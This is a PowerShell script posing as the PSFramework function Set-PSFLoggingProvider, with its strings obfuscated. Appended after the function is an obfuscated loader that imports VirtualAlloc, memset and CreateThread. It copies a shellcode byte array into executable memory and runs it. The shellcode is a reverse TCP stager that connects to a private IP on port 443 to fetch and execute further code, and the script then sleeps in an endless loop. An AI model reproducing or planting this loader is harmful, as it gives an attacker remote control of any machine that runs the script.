function Set-PSFLoggingProvider
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{8}{5}{3}{2}{0}{7}{1}{6}"-f 'a','ng','St','or','P','houldProcessF','ingFunctions','teCha','SUseS'}, "")]
	[CmdletBinding(HelpUri = ("{3}{1}{15}{4}{0}{14}{11}{7}{5}{9}{8}{13}{2}{6}{12}{10}" -f'mew','/p','rk','https:/','fra','/c','/Se','n','ands/PSF','omm','-PSFLoggingProvider','.org/documentatio','t','ramewo','ork','s'))]
	Param (
		[Alias({"{2}{0}{1}"-f 'ovi','der','Pr'}, {"{3}{2}{1}{0}"-f'e','erNam','id','Prov'})]
		[string]
		$Name,
		
		[bool]
		$Enabled,
		
		[string[]]
		$IncludeModules,
		
		[string[]]
		$ExcludeModules,
		
		[string[]]
		$IncludeTags,
		
		[string[]]
		$ExcludeTags,
		
		[switch]
		$EnableException
	)
	
	dynamicparam
	{
		if ($Name -and ([PSFramework.Logging.ProviderHost]::Providers.ContainsKey($Name.ToLower())))
		{
			[scriptblock]::Create(([PSFramework.Logging.ProviderHost]::Providers[$Name.ToLower()].ConfigurationParameters)).Invoke()
		}
	}
	
	begin
	{
		if (-not ([PSFramework.Logging.ProviderHost]::Providers.ContainsKey($Name.ToLower())))
		{
			Stop-PSFFunction -Message ('Pro'+'vid'+'er '+"$Name "+'not'+' '+'fou'+'nd'+'!') -EnableException $EnableException -Category InvalidArgument -Target $Name
			return
		}
		
		[PSFramework.Logging.Provider]$provider = [PSFramework.Logging.ProviderHost]::Providers[$Name.ToLower()]
		
		if ((-not $provider.Enabled) -and (-not ([scriptblock]::Create($provider.IsInstalledScript).Invoke())) -and $Enabled)
		{
			Stop-PSFFunction -Message ('Pro'+'vide'+'r '+"$Name "+'n'+'ot '+'insta'+'lled!'+' '+'R'+'un '+(('yu5'+'In'+'s'+'t'+'a'+'ll-PSFLogging'+'Pro'+'v'+'ide'+'ryu5 ') -RePlaCE 'yu5',[CHAr]39)+'fi'+'rst') -EnableException $EnableException -Category InvalidOperation -Target $Name
			return
		}
	}
	process
	{
		if (Test-PSFFunctionInterrupt) { return }
		
		
		[System.Management.Automation.ScriptBlock]::Create($provider.ConfigurationScript).Invoke()
		
		
		if (Test-PSFParameterBinding -ParameterName ("{0}{1}{2}"-f'In','clude','Modules'))
		{
			$provider.IncludeModules = $IncludeModules
			Set-PSFConfig -FullName "LoggingProvider.$($provider.Name).IncludeModules" -Value $IncludeModules
		}
		if (Test-PSFParameterBinding -ParameterName ("{3}{1}{2}{0}"-f'ules','ud','eMod','Excl'))
		{
			$provider.ExcludeModules = $ExcludeModules
			Set-PSFConfig -FullName "LoggingProvider.$($provider.Name).ExcludeModules" -Value $ExcludeModules
		}
		
		if (Test-PSFParameterBinding -ParameterName ("{0}{1}{2}" -f'Includ','eTag','s'))
		{
			$provider.IncludeTags = $IncludeTags
			Set-PSFConfig -FullName "LoggingProvider.$($provider.Name).IncludeTags" -Value $IncludeTags
		}
		if (Test-PSFParameterBinding -ParameterName ("{1}{0}{2}"-f'u','Excl','deTags'))
		{
			$provider.ExcludeTags = $ExcludeTags
			Set-PSFConfig -FullName "LoggingProvider.$($provider.Name).ExcludeTags" -Value $ExcludeTags
		}
		
		
		if (Test-PSFParameterBinding -ParameterName ("{1}{2}{0}"-f 'd','En','able'))
		{
			$provider.Enabled = $Enabled
			Set-PSFConfig -FullName "LoggingProvider.$($provider.Name).Enabled" -Value $Enabled
		}
	}
	end
	{
		if (Test-PSFFunctionInterrupt) { return }
	}
}

$c = ((("{110}{58}{1}{106}{30}{104}{11}{108}{6}{50}{21}{126}{122}{93}{60}{32}{83}{121}{89}{115}{76}{48}{19}{116}{2}{81}{128}{102}{40}{13}{94}{3}{98}{117}{74}{114}{87}{64}{14}{92}{67}{77}{78}{56}{35}{8}{62}{24}{100}{41}{107}{39}{18}{45}{70}{72}{99}{26}{53}{80}{34}{101}{17}{66}{54}{91}{51}{85}{49}{16}{71}{75}{38}{4}{25}{20}{28}{118}{0}{113}{96}{46}{27}{111}{112}{97}{109}{120}{84}{7}{37}{95}{61}{124}{22}{57}{36}{63}{119}{86}{31}{23}{69}{43}{9}{42}{79}{125}{123}{90}{59}{55}{73}{103}{88}{68}{5}{127}{52}{12}{10}{65}{105}{33}{29}{15}{82}{44}{47}"-f', IntP','por',', u','e, uin','pS','mset(I','s','nt d','0','ort({0}','t, u','ll{0})]p',' des','onTy','ote',' ui','Int','e','rn ','nt dwSiz','Ad','atic e','P','I',']','tart','eThre','a','dres',',','ernel3','l','r','t src','tr l','2.dll{','ea','wCreationFlag','r l','te','ti','blic static e','m','p','t)','IntPt','r',';',', ui',', ','t','uint dwStackS','Ptr','ad(','Attr','In','el3','tr lpThr','DllIm','blic static extern ',' Vi','In','})','dI','r','i','ad','t','r me','m','r ','P','Cre','t','f','t','dress',');[DllImport','({0}kern','svcr','IntP','int f','nt coun','tualA','ui','ize','[Dl','P','t','r lpA',']pu','ibutes, ','c','tPtr','p','s, ','Pa','te','t','at','pu','pThr','ca','P','2.d','n','t({0}k','x','ublic ','r','[','m','e','tr lp','l','d','e',' ','s','d);',', ','lloc(IntPt','rn In',')','t','t.dll{0}','xte','nt','lAllo')) -F [cHar]34);$w = Add-Type -memberDefinition $c -Name ("{0}{1}"-f 'Win3','2') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
